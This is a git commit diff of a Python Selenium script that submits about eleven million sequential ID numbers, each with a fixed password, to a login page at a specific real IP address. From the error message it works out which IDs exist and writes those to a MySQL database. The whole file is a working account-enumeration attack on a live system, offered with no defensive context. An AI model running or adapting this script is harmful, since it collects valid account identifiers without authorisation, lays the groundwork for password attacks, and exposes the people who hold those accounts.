fca813f240330b3f3f1c9cb4826825f3104c17af
Amor <274310994@qq.com>
2019-04-03 18:28:27 +0800

    进度更新

--- jiaogonghao.py
+++ jiaogonghao.py
@@ -11,18 +11,20 @@ browser.get('http://60.219.165.24')
 mysqlCommand = MySQLCommand()
 mysqlCommand.connectMysql()
 
-
-for i in range(2004808794, 2016026399):
-    username = browser.find_element_by_name('zjh')
-    username.send_keys(i)
-    username = browser.find_element_by_name('mm')
-    username.send_keys('23333')
-    btn = browser.find_element_by_id('btnSure')
-    btn.click()
-    message = browser.find_elements_by_xpath('//td[@class="errorTop"]')[0].text
-    if message == "你输入的证件号不存在，请您重新输入！":
-        print('未通过：' + str(i))
-        continue
-    else:
-        mysqlCommand.insertData_id(i)
-        print(i)
+try:
+    for i in range(2004809590, 2016026399):
+        username = browser.find_element_by_name('zjh')
+        username.send_keys(i)
+        username = browser.find_element_by_name('mm')
+        username.send_keys('23333')
+        btn = browser.find_element_by_id('btnSure')
+        btn.click()
+        message = browser.find_elements_by_xpath('//td[@class="errorTop"]')[0].text
+        if message == "你输入的证件号不存在，请您重新输入！":
+            print('未通过：' + str(i))
+            continue
+        else:
+            mysqlCommand.insertData_id(i)
+            print(i)
+finally:
+    browser.close()
